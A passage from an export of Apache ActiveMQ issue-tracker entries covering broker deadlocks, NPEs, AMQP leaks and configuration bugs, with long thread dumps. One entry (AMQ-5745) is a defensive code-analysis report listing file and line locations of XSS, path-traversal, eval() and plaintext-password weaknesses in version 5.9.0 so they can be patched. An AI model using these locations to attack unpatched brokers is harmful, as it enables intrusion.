org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188)        at org.apache.activemq.transport.amqp.AmqpTransportFilter.sendToActiveMQ(AmqpTransportFilter.java:114)        at org.apache.activemq.transport.amqp.AmqpProtocolConverter.sendToActiveMQ(AmqpProtocolConverter.java:1497)        at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onSenderOpen(AmqpProtocolConverter.java:1421)        at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onLinkOpen(AmqpProtocolConverter.java:577)        at org.apache.activemq.transport.amqp.AmqpProtocolConverter.processLinkEvent(AmqpProtocolConverter.java:389)        at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onFrame(AmqpProtocolConverter.java:334)        at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onAMQPData(AmqpProtocolConverter.java:275)        at org.apache.activemq.transport.amqp.AmqpTransportFilter.onCommand(AmqpTransportFilter.java:98)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.amqp.AmqpFrameParser$1.onFrame(AmqpFrameParser.java:57)        at org.apache.activemq.transport.amqp.AmqpFrameParser$5.parse(AmqpFrameParser.java:205)        at org.apache.activemq.transport.amqp.AmqpFrameParser$4.parse(AmqpFrameParser.java:178)        at org.apache.activemq.transport.amqp.AmqpFrameParser.parse(AmqpFrameParser.java:73)        at org.apache.activemq.transport.amqp.AmqpNioTransport.serviceRead(AmqpNioTransport.java:118)        at org.apache.activemq.transport.amqp.AmqpNioTransport.access$000(AmqpNioTransport.java:44)        at org.apache.activemq.transport.amqp.AmqpNioTransport$1.onSelect(AmqpNioTransport.java:75)        at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:97)        at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        at java.lang.Thread.run(Thread.java:745)The reason for the NPE is that in the following excerpt from TempQueue.java, tempDest.getConnectionId() returns null:        if (!context.isFaultTolerant()                && (!context.isNetworkConnection() && !tempDest                        .getConnectionId().equals(                                sub.getConsumerInfo().getConsumerId()                                        .getConnectionId()))) {The ActiveMQTempDestination tempDest is created by ActiveMQDestination.createDestination(String, byte):ActiveMQTempQueue(ActiveMQTempDestination).<init>(String) line: 39 ActiveMQTempQueue.<init>(String) line: 36 ActiveMQDestination.createDestination(String, byte) line: 95 AmqpProtocolConverter.createDestination(Object) line: 951 AmqpProtocolConverter.onSenderOpen(Sender, AmqpProtocolConverter$AmqpSessionContext) line: 1375 AmqpProtocolConverter.onLinkOpen(Link) line: 577 ...The created object is returned through the call stack as-is until it reaches the onSenderOpen frame, where it is assigned to the ConsumerInfo. The connection ID is never set.Proposed fix: in DestinationFactoryImpl.createDestination(ConnectionContext, ActiveMQDestination, DestinationStatistics), after casting destination to ActiveMQTempDestination and before instantiating TempQueue, the connection ID (and any other required information) could be set from the ConnectionContext.
issueID:AMQ-5712
type:Bug
changed files:
texts:Broker can deadlock when using queues while producers wait on disk space
I am experiencing a deadlock when using a Queue with non-persistent messages.  The queue has a cursor high memory water mark set (right now at 70%).  When a producer is producing messages quickly to the queue and that limit gets hit, the broker can deadlock.   I have tried setting producerWindowSize and alwaysSyncSend which did not seem to help. When the broker hits that limit, I am unable to do things like purge the queue.  Consumers can also deadlock as well. Note that this appears to be the same issue as described in this ticket here: AMQ-2475 .  The difference is that I am using a Queue and not a Topic and the fix for this appears to only have been for Topics.The problem appears to be in the Queue class on line 1852 inside the cursorAdd method.  The method being called is return messages.addMessageLast(msg); which will block indefinitely if there is no space available, which in turn ties up the messagesLock from being used by any other threads.  We have seen a deadlock where consumers can"t consume because they are waiting on this lock.   It looks like in AMQ-2475 part of the fix was to replace messages.addMessageLast(msg) with messages.tryAddMessageLast(msg, 10).  I also noticed that not all of the message cursors support tryAddMessageLast, which could be a problem.  FilePendingMessageCursor implements it but the rest of the cursors (notably StoreQueueCursor) simply delegate back to addMessageLast in the parent class.  So part of this fix may require implementing tryAddMessageLast across more cursors.Here is part of the thread dump showing the stuck producer:"ActiveMQ Transport: ssl:///192.168.3.142:38589" daemon prio=10 tid=0x00007fb46c006000 nid=0x3b1a runnable [0x00007fb4b8a0d000]   java.lang.Thread.State: TIMED_WAITING (parking)        at sun.misc.Unsafe.park(Native Method)        - parking to wait for  <0x00000000cfb13cd0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2176)        at org.apache.activemq.usage.Usage.waitForSpace(Usage.java:103)        at org.apache.activemq.usage.Usage.waitForSpace(Usage.java:90)        at org.apache.activemq.usage.Usage.waitForSpace(Usage.java:80)        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:235)        - locked <0x00000000d2015ee0> (a org.apache.activemq.broker.region.cursors.FilePendingMessageCursor)        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:207)        - locked <0x00000000d2015ee0> (a org.apache.activemq.broker.region.cursors.FilePendingMessageCursor)        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:97)        - locked <0x00000000d1f20908> (a org.apache.activemq.broker.region.cursors.StoreQueueCursor)
issueID:AMQ-5713
type:Bug
changed files:
texts:doHandleReplyTo cannot be set in activemq.xml
While configuring the bridges, if we try to set the doHandleReplyTo parameter in the activemq.xml then a BeanCreationException is thrown.Below is the sample:<inboundQueueBridges> <inboundQueueBridge  inboundQueueName = "inBoundQ"  localQueueName   = "localTestQ"  doHandleReplyTo="false"/></inboundQueueBridges>Attached is the log file.The reason could be, the setter/getters are protected in DestinationBridge.java
issueID:AMQ-5718
type:Bug
changed files:
texts:Prevent adding a message to topic subscriber while we&#39;re discarding a message
These additional messages can only be advisories generated in the process, which can cause more messages to get discarded and generate a recursive loop with StackOverflow exception as the end result.
issueID:AMQ-5719
type:Improvement
changed files:TopicRegion.java
texts:Add clientId and subscriptionName to all durable-related exceptions and log messages within TopicRegion
In order to make it easier to debug durable related issues it would be useful if the error messages included the clientId and subscriptionName.  The specific use case for this was that a client tried to remove their durable subscription using the wrong clientId and received an error message which did not include the clientId so it was difficult to debug.  The error received just said: javax.jms.InvalidDestinationException: No durable subscription exists for: <subscriptionName>It would be more useful if the error was: javax.jms.InvalidDestinationException: No durable subscription exists for clientId: <clientId> and subscriptionName: <subscriptionName>I will be attaching a pull request to this ticket with the 2 specific exception messages I would like to see changed in TopicRegion.
issueID:AMQ-5721
type:Bug
changed files:pom.xml
PooledConnectionFactory.java
ConnectionPool.java
common-bin.xml
features-core.xml
PooledSession.java
ActiveMQConfiguration.java
texts:Update AMQ to commons-pool2
Update ActiveMQ to use commons-pool2 instead of commons-pool. AMQ-5636 will need it.  The JMS pool and other components should use it as well.
issueID:AMQ-5723
type:Bug
changed files:
texts:AMQP: Presettle deliveries miss calling local settle which leaks resources
For incoming AMQP deliveries that are already settled the AMQP transport is not doing its own settle on the delivery leading Proton to retain delivery resources forever eventually exhausting the heap.
issueID:AMQ-5724
type:Bug
changed files:
texts:Query command don&#39;t filter properly
--xobjname parameter is not taken into account and --view parameter doesn"t show attributes in any meaningful order
issueID:AMQ-5729
type:Bug
changed files:
texts:Audit log shows plaintext password for QueueView.sendTextMessage
Each AuditLogEntry dumps all arguments for the method call to the Audit log.  Some of these arguments should not be logged as they may contain senstive information.  For example QueueView.sendTextMessage contains user password information.Example Log Entry:anonymous called org.apache.activemq.broker.jmx.QueueView.sendTextMessage&#91;String, admin, mypassword&#93; at 04-03-2013 11:00:00
issueID:AMQ-5731
type:Bug
changed files:
texts:AMQP: corrupted incoming frame can cause the connection to drop but not be unregistered on the Broker.
If a corrupted AMQP frame arrives after a connection is opened the Transport is stopped but the Connection is not unregistered with the Broker meaning a client with the same container ID can never connect again until the Broker is restarted.
issueID:AMQ-5733
type:Bug
changed files:
texts:kill -9 always results in failure signal
Using https://github.com/rgevaert/activemq2deb I am trying to distribute upgrades to our fleet. This results in failure each time.Looking into the matter the activemq script tries to stop the broker via JMX. This is not configured, so fails.It falls back to issuing "kill -9 <PID>" then immediately exits with code 1. This code 1 causes the packaging script to bail and thus we end up with a mess.A possible solution is to return the "kill" command"s own result. This doesn"t necessarily reflect whether "kill" succeeded in terminating the PID however.A second possible solution is to detect the presence of "start-stop-daemon" and use this in preference. Narrows down the cases in which it does not work at least.I am of the opinion that a script aiming of cross-platform compatibility is probably never going to work completely so detecting and making use of per-system tooling is probably best long term, meantime would returning "kill"s" exit code help?
issueID:AMQ-5734
type:Improvement
changed files:
texts:Support MQTT 3.1 silent subscription fail
There"s a difference in what 3.1 and 3.1.1 specs say should happen when an unauthorised subscribe happens. In 3.1, the broker don"t informs the client so it just silently ignores the problem. In 3.1.1 it sends special QoS back. We currently only implement the later. We need to implement also 3.1 behaviour for older clients.
issueID:AMQ-5735
type:Bug
changed files:
texts:increment redeliverCounter in the absence of client supplied information
A consumer remove info contains the lastDeliveredSequenceId the consumer has delivered. In the absence of this information, for example when the consumer does a system exit or the connection drops - this information will be lost. The broker should increment redelivery to reflect the delivery attempt.Currently lastDeliveredSequenceId==0 indicates missing information but that ignores the fact that the messageid broker sequence could be 0. A value of -1 should indicate nothing was delivered, > -1 the last sequence and from the broker side, -2 indicating that the broker provided the information and redelivery should be incremented. ie; -2 covers the client abort case.
issueID:AMQ-5737
type:Improvement
changed files:AmqpReceiver.java
texts:AMQP: Receiver uses case sensitive string compare to lookup transformer.
The AMQP transport is using a case sensitive compare to lookup the requested message transformer so if someone uses "JMS" instead of "jms" they get the native variant instead.
issueID:AMQ-5738
type:Bug
changed files:AmqpSender.java
AmqpConnection.java
AmqpSession.java
texts:AMQP memory leak of sender links while closing non-durable consumers
When the AmqpSender link object for a non-durable consumer is closed it is retained in maps within AmqpSession and AmqpConnection and as result will remain in memory until the connection closes.
issueID:AMQ-574
type:Bug
changed files:OracleJDBCAdapter.java
TransactionContext.java
texts:bug in oracle JDBC driver
This was submitted by haliq on the mail list and forum...http://forums.activemq.org/posts/list/215.page
issueID:AMQ-5740
type:Wish
changed files:
texts:Support --resetStatistics option for &#39;purge&#39; command
Please consider adding a statistics reset option to the "purge" console command.
issueID:AMQ-5742
type:Bug
changed files:PrefetchSubscription.java
texts:Destination dispatched count statistic not reflecting redelivery/redispatch
Tracking down in intermittent failure of org.apache.activemq.network.DemandForwardingBridgeTest.testSendThenAddConsumerthe problem turned out to be a decrement of the dispatched count when the consumer was removed.So before the removal, most of the time, the stat was 1, and the test passed. But if the removal was complete, the dispatched count was decremented in error by the unacked message count. This is wrong. The dispatched stat needs to reflect what happened  Otherwise it tracks the dequeue count.
issueID:AMQ-5743
type:Bug
changed files:
texts:purged of 0 messages | org.apache.activemq.broker.region.Queue logged when clearing a temp queue
since upgrading to 5.11 I"m getting a lot of these in the logs2015-03-10 09:50:36,212 | INFO  | temp-queue://ID:STATS2-37496-1425976359943-3:1604:1 purged of 0 messages | org.apache.activemq.broker.region.Queue | ActiveMQ Transport: ssl:///213.198.74.90:36525According to Garry Tully this is an oversight, quote from the users mailing list"that is an oversight, when purge is called from a jmx op, we want tolog the event, but it is also called to clear a temp queue when thetemp queue is deleted and that should not generate a log message. Ithink that is your case.Can you open a jira to track this so that others will see theresolution. thanks"
issueID:AMQ-5744
type:Bug
changed files:
texts:Password encryption is broken in OSGi
We"re missing jasypt-spring31 bundle in the feature definition.
issueID:AMQ-5745
type:Bug
changed files:FTPBlobUploadStrategy.java
ActiveMQSslConnectionFactory.java
CreateCommand.java
JmsProducerClient.java
BlobJDBCAdapter.java
PropertiesBrokerFactory.java
AbstractJmsClientSystem.java
BrokerService.java
TextFileCertificateLoginModule.java
DiskBenchmark.java
ActiveMQSession.java
PageFile.java
AjaxServlet.java
DefaultBlobUploadStrategy.java
BlobUploader.java
StreamJDBCAdapter.java
ProtocolConverter.java
FileSystemBlobStrategy.java
XmlFilePerfReportWriter.java
IOHelper.java
texts:Code analysis revealed multiple vulnerable sections of code
Code analysis revealed multiple vulnerable sections of code in ActiveMQ 5.9.0.  A patch file is attached that address the issues below.activemq-web/src/main/resources/org/apache/activemq/web/prototype.js:700,706 This code uses the  "eval()" function to evaluate JSON code &#8211; this method is deprecated and dangerous and has been replaced by the JSON.parse() method, which is supported in all modern browsers &#8211; considering that less than 2% of modern computers are still using legacy browsers, we believe the code should be upgraded to use the more secure methodactivemq-broker/src/main/java/org/apache/activemq/broker/BrokerService.java:248activemq-broker/src/main/java/org/apache/activemq/broker/PropertiesBrokerFactory.java:59activemq-broker/src/main/java/org/apache/activemq/util/IOHelper.java:257,259activemq-client/src/main/java/org/apache/activemq/ActiveMQSslConnectionFactory.java:130,162activemq-client/src/main/java/org/apache/activemq/blob/DefaultBlobUploadStrategy.java:43,58activemq-client/src/main/java/org/apache/activemq/blob/FTPBlobUploadStrategy.java:41activemq-client/src/main/java/org/apache/activemq/blob/FileSystemBlobStrategy.java:68,77activemq-console/src/main/java/org/apache/activemq/console/command/CreateCommand.java:194,218,219activemq-fileserver/src/main/java/org/apache/activemq/util/IOHelper.java:102,104activemq-jaas/src/main/java/org/apache/activemq/jaas/TextFileCertificateLoginModule.java:92,127activemq-jdbc-store/src/main/java/org/apache/activemq/store/jdbc/adapter/BlobJDBCAdapter.java:142activemq-jdbc-store/src/main/java/org/apache/activemq/store/jdbc/adapter/StreamJDBCAdapter.java:51activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/page/PageFile.java:198activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/util/DiskBenchmark.java:214,246,270activemq-stomp/src/main/java/org/apache/activemq/transport/stomp/ProtocolConverter.java:68activemq-tooling/activemq-perf-maven-plugin/src/main/java/org/apache/activemq/tool/AbstractJmsClientSystem.java:266activemq-web/src/main/java/org/apache/activemq/web/AjaxServlet.java:67activemq-tooling/activemq-perf-maven-plugin/src/main/java/org/apache/activemq/tool/JmsProducerClient.java:356activemq-tooling/activemq-perf-maven-plugin/src/main/java/org/apache/activemq/tool/reports/XmlFilePerfReportWriter.java:198 Resource leaks are possible at these code locations (the patched code releases the resources within a finally() statement)activemq-broker/src/main/java/org/apache/activemq/broker/jmx/DestinationView.java:330activemq-client/src/main/java/org/apache/activemq/ActiveMQConnectionFactory.java:283,290activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/journal/CallerBufferingDataFileAppender.java:182activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/journal/DataFileAppender.java:391activemq-kahadb-store/src/main/java/org/apache/activemq/store/kahadb/disk/journal/Journal.java:568 NULL dereferences are possible at these code locationsactivemq-broker/src/main/java/org/apache/activemq/transport/vm/VMTransport.java:269 Double-locking of this form is vulnerable to race conditionsactivemq-http/src/main/java/org/apache/activemq/transport/http/HttpTunnelServlet.java:196,236activemq-web/src/main/java/org/apache/activemq/web/MessageServlet.java:278,284 XSS reflection is possible at these code locations (an XSS filter should be added)activemq-fileserver/src/main/java/org/apache/activemq/util/RestFilter.java:72 Path manipulation is possible via ".." directory traversalactivemq-client/src/main/java/org/apache/activemq/thread/PooledTaskRunner.java:141 A return statement inside a finally block will cause any exception that might be thrown in the try or catch block to be discarded.activemq-log4j-appender/src/main/java/org/apache/activemq/util/JmsLogAppender.java:68 Recording passwords to a logfile in plaintext is inadvisable
issueID:AMQ-5746
type:Bug
changed files:
texts:Slave broker not registering JMX mBean when scheduler is enabled
<broker xmlns="http://activemq.apache.org/schema/core" brokerName="localhost" dataDirectory="${activemq.data}" schedulerSupport="true">The slave broker does not register it"s mBean information vis JMX.  From looking at the log of the slave broker the following can be seen:INFO | Database /scheduler/lock is locked... waiting 10 seconds for the database to be unlocked. Reason: java.io.IOException: File "/scheduler/lock" could not be locked.In this case it appears the broker is stuck trying to lock the scheduler lock file before the mBean can be registered.Without the scheduler enable, the mBean is registered in JMX and log shows the broker is just waiting to lock the kahadb lock file:INFO | Database kahadb/lock is locked... waiting 5 seconds for the database to be unlocked. Reason: java.io.IOException: File "kahadb/lock" could not be locked.
issueID:AMQ-5748
type:New Feature
changed files:
texts:Add the ability to get Message Size from a Message Store
Currently, the MessageStore interface supports getting a count for messages ready to deliver using the getMessageCount method.  It would also be very useful to be able to retrieve the message sizes for those counts as well for keeping track of metrics.I"ve created a pull request to address this that adds a getMessageSize method that focuses specifically on KahaDB and the Memory store.  The KahaDB store uses the same strategy as the existing getMessageCount method, which is to iterate over the index and total up the size of the messages.  There are unit tests to show the size calculation and a unit test that shows a store based on version 5 working with the new version (the index is rebuilt)One extra issue is that the size was not being serialized to the index (it was not included in the marshaller) so that required making a slight change and adding a new marshaller for Location to store the size in the location index of the store.  Without this change, the size computation would not work when the broker was restarted since the size was not serialized.Note that I wasn"t sure the best way to handle the new marshaller and version compatibilities so I incremented the KahaDB version from 5 to 6. If an old version of the index is loaded, the index should be detected as corrupted and be rebuilt with the new format.  If there is a better way to handle this upgrade let me know and the patch can certainly be updated.
issueID:AMQ-575
type:Bug
changed files:TransactionContext.java
texts:deadlock in QueueClusterTest
here"s the log    &#91;junit&#93; Running org.apache.activemq.transport.QueueClusterTest^    &#91;junit&#93; Full thread dump Java HotSpot(TM) Client VM (1.5.0_05-48 mixed mode, sharing):    &#91;junit&#93;     &#91;junit&#93; "session Task" daemon prio=7 tid=0x00540cc0 nid=0x1927200 waiting for monitor entry &#91;0xf2d49000..0xf2d4aad0&#93;    &#91;junit&#93;     at org.apache.activemq.broker.region.Queue.dropEvent(Queue.java:263)    &#91;junit&#93;     - waiting to lock <0x1c926760> (a java.util.LinkedList)    &#91;junit&#93;     at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:55)    &#91;junit&#93;     at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:133)    &#91;junit&#93;     - locked <0x1c8c9340> (a org.apache.activemq.broker.region.QueueSubscription)    &#91;junit&#93;     at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:203)    &#91;junit&#93;     at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:329)    &#91;junit&#93;     at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:176)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:59)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:59)    &#91;junit&#93;     at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:71)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.processMessageAck(AbstractConnection.java:342)    &#91;junit&#93;     at org.apache.activemq.command.MessageAck.visit(MessageAck.java:178)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)    &#91;junit&#93;     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)    &#91;junit&#93;     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)    &#91;junit&#93;     - locked <0x1c8180d8> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)    &#91;junit&#93;     at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1041)    &#91;junit&#93;     at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1617)    &#91;junit&#93;     at org.apache.activemq.ActiveMQMessageConsumer.afterMessageIsConsumed(ActiveMQMessageConsumer.java:554)    &#91;junit&#93;     at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:716)    &#91;junit&#93;     at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:93)    &#91;junit&#93;     at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:146)    &#91;junit&#93;     at org.apache.activemq.thread.SimpleTaskRunner.runTask(SimpleTaskRunner.java:110)    &#91;junit&#93;     at org.apache.activemq.thread.SimpleTaskRunner.access$100(SimpleTaskRunner.java:25)    &#91;junit&#93;     at org.apache.activemq.thread.SimpleTaskRunner$1.run(SimpleTaskRunner.java:43)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:643)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp:///127.0.0.1:53756" daemon prio=9 tid=0x00539830 nid=0x1914400 runnable &#91;0xf2438000..0xf2438ad0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp://localhost/127.0.0.1:53747" prio=5 tid=0x005394c0 nid=0x1914000 in Object.wait() &#91;0xf23b6000..0xf23b7ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c926f00> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at org.apache.activemq.thread.Valve.turnOff(Valve.java:68)    &#91;junit&#93;     - locked <0x1c926f00> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.broker.region.Queue.removeSubscription(Queue.java:171)    &#91;junit&#93;     at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:179)    &#91;junit&#93;     at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:280)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)    &#91;junit&#93;     at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:164)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)    &#91;junit&#93;     at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:107)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.processRemoveConsumer(AbstractConnection.java:431)    &#91;junit&#93;     at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:63)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)    &#91;junit&#93;     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)    &#91;junit&#93;     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)    &#91;junit&#93;     - locked <0x1c8d0a80> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteConsumerAdvisory(DemandForwardingBridge.java:331)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:235)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)    &#91;junit&#93;     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)    &#91;junit&#93;     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp://localhost/127.0.0.1:53747" prio=5 tid=0x005390f0 nid=0x1913c00 in Object.wait() &#91;0xf1b26000..0xf1b26ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c8629b8> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch.await(CountDownLatch.java:173)    &#91;junit&#93;     - locked <0x1c8629b8> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.waitStarted(DemandForwardingBridge.java:481)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:250)    &#91;junit&#93;     - locked <0x1c862a40> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)    &#91;junit&#93;     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)    &#91;junit&#93;     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp:///127.0.0.1:53755" daemon prio=9 tid=0x00538e90 nid=0x1912800 runnable &#91;0xf22b5000..0xf22b5ad0&#93;    &#91;junit&#93;     at java.net.SocketInputStream.socketRead0(Native Method)    &#91;junit&#93;     at java.net.SocketInputStream.read(SocketInputStream.java:129)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)    &#91;junit&#93;     at java.io.DataInputStream.readInt(DataInputStream.java:353)    &#91;junit&#93;     at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:180)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "tcp://localhost/127.0.0.1:53749" prio=5 tid=0x00538a00 nid=0x1912400 in Object.wait() &#91;0xf2234000..0xf2234ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c862b60> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch.await(CountDownLatch.java:173)    &#91;junit&#93;     - locked <0x1c862b60> (a edu.emory.mathcs.backport.java.util.concurrent.CountDownLatch)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.waitStarted(DemandForwardingBridge.java:481)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:250)    &#91;junit&#93;     - locked <0x1c862be8> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)    &#91;junit&#93;     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)    &#91;junit&#93;     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)    &#91;junit&#93;     at 